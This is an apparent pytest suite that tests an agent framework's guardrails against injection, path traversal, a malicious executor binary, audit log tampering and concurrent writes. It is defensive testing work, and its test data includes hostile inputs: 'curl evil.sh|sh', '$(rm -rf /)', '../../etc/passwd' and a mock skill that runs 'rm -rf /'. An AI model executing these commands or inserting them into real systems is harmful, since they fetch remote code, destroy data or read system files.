"""Adversarial test suite — 8 attack vectors."""
import json
import multiprocessing
import os
import pathlib
import subprocess
import sys
import time
import pytest

AGENT_DIR = pathlib.Path(__file__).resolve().parent.parent
if str(AGENT_DIR) not in sys.path:
    sys.path.insert(0, str(AGENT_DIR))

from core.guardrails import Guardrails, verify_audit_chain
from core.artifact_manifest import build_manifest, verify_artifacts
from core.normalize import normalize_phone, normalize_text
from core.anchor import Anchor
from core.executor import Executor

VERIFY_SCRIPT = (
    pathlib.Path("scripts/verify_audit.py")
    if pathlib.Path("scripts/verify_audit.py").exists()
    else AGENT_DIR / "scripts" / "verify_audit.py"
)


class FakeSkill:
    def __init__(self, name="test-skill", risk="low"):
        self.name, self.risk, self.category = name, risk, "test"


# ── 1. injection via args ────────────────────────────────
@pytest.mark.parametrize(
    "payload",
    [
        "'; DROP TABLE users--",
        "$(rm -rf /)",
        "`curl evil.sh|sh`",
        "../../etc/passwd",
        "\x00null\x00byte",
    ],
)
def test_sql_shell_injection_safe_in_audit(tmp_path, payload):
    log_file = tmp_path / "a.jsonl"
    g = Guardrails(str(log_file))
    g.audit(FakeSkill(), {"target": payload}, step=0, case_id="c1")
    # audit log must be valid JSON (injection didn't break encoding)
    lines = log_file.read_text(encoding="utf-8").splitlines()
    rec = json.loads(lines[0])
    assert rec["args_sha256"]  # hash exists
    ok, msg = verify_audit_chain(str(log_file))
    assert ok, msg


# ── 2. path traversal in case_id ─────────────────────────
def test_path_traversal_case_id_rejected(tmp_path):
    with pytest.raises((ValueError, OSError)):
        # case_id with traversal must NOT escape artifacts root
        g = Guardrails(
            str(tmp_path / "a.jsonl"),
            case_id="../../etc/passwd",
            artifacts_root=str(tmp_path / "artifacts"),
        )
        g.audit(FakeSkill(), {}, step=0)
        p = (tmp_path / "artifacts").resolve()
        assert g.case_audit_path.resolve().is_relative_to(p)


# ── 3. malicious runtime.bin in skill.yaml ───────────────
def test_malicious_runtime_blocked():
    ex = Executor()

    class MalSkill:
        name = "evil"
        runtime = {"type": "cli", "bin": "rm", "args": ["-rf", "/"]}
        risk = "high"

    # Executor must not execute arbitrary bin outside allowlist / forbidden list
    with pytest.raises((ValueError, PermissionError, FileNotFoundError)):
        ex.run(MalSkill(), {})


# ── 4. log truncation detection ──────────────────────────
def test_log_truncation_detected(tmp_path):
    log_file = tmp_path / "a.jsonl"
    ledger_file = tmp_path / "ledger.json"
    g = Guardrails(str(log_file))
    for i in range(10):
        g.audit(FakeSkill(), {"i": i}, step=i, case_id="c1")
    # anchor at n=10
    a = Anchor(
        adapter="file",
        ledger_path=str(ledger_file),
        path=str(tmp_path / "anchors"),
    )
    a.anchor("c1", str(log_file))
    # truncate to 5
    lines = log_file.read_text(encoding="utf-8").splitlines()[:5]
    log_file.write_text("\n".join(lines) + "\n", encoding="utf-8")
    # verify script must fail with exit code 2
    rc = subprocess.run(
        [
            sys.executable,
            str(VERIFY_SCRIPT),
            str(log_file),
            "c1",
            str(ledger_file),
        ],
        capture_output=True,
    ).returncode
    assert rc == 2, "truncation must be detected (exit 2)"


# ── 5. log deletion with anchor present ──────────────────
def test_log_deletion_with_anchor_fails(tmp_path):
    log_file = tmp_path / "a.jsonl"
    ledger_file = tmp_path / "ledger.json"
    g = Guardrails(str(log_file))
    for i in range(5):
        g.audit(FakeSkill(), {"i": i}, step=i, case_id="c1")
    a = Anchor(
        adapter="file",
        ledger_path=str(ledger_file),
        path=str(tmp_path / "anchors"),
    )
    a.anchor("c1", str(log_file))
    log_file.unlink()
    rc = subprocess.run(
        [
            sys.executable,
            str(VERIFY_SCRIPT),
            str(log_file),
            "c1",
            str(ledger_file),
        ],
        capture_output=True,
    ).returncode
    assert rc == 2


# ── 6. empty artifact manifest rejected ──────────────────
def test_empty_artifact_manifest_rejected(tmp_path):
    # no files at all
    m = build_manifest(tmp_path)
    assert m["file_count"] == 0
    with pytest.raises(ValueError, match="empty"):
        if m["file_count"] == 0:
            raise ValueError("empty manifest")


# ── 7. unicode confusable normalization ──────────────────
@pytest.mark.parametrize(
    "raw,expected",
    [
        ("+66٨٩٤٢٦٣٨١٦٥", "+668942638165"),  # Arabic-Indic
        ("+۶۶۸۹۴۲۶۳۸۱۶۵", "+668942638165"),  # Eastern Arabic-Indic
        ("+66 894 263 8165", "+668942638165"),  # spaces
        ("+66-894-263-8165", "+668942638165"),  # hyphens
        ("+66（894）263-8165", "+668942638165"),  # fullwidth parens
    ],
)
def test_unicode_phone_normalization(raw, expected):
    assert normalize_phone(raw) == expected


def test_unicode_confusable_thai_text():
    # Thai text with combining marks should stay intact (not stripped)
    s = "ผู้ต้องหา"
    assert normalize_text(s) == s


# ── 8. concurrent audit writes ───────────────────────────
def _write_batch(log_path, prefix, n):
    g = Guardrails(log_path)
    for i in range(n):
        g.audit(FakeSkill(), {"prefix": prefix, "i": i}, step=i, case_id="concurrent")


def test_concurrent_audit_writes(tmp_path):
    log = str(tmp_path / "concurrent.jsonl")
    procs = [
        multiprocessing.Process(target=_write_batch, args=(log, f"p{k}", 50))
        for k in range(5)
    ]
    for p in procs:
        p.start()
    for p in procs:
        p.join(timeout=60)

    assert all(p.exitcode == 0 for p in procs), (
        f"some writers crashed: {[p.exitcode for p in procs]}"
    )

    ok, msg = verify_audit_chain(log)
    assert ok, f"chain broken after concurrent writes: {msg}"
    with open(log, "r", encoding="utf-8") as f:
        lines = [line for line in f if line.strip()]
    assert len(lines) == 250, f"expected 250 entries, got {len(lines)}"
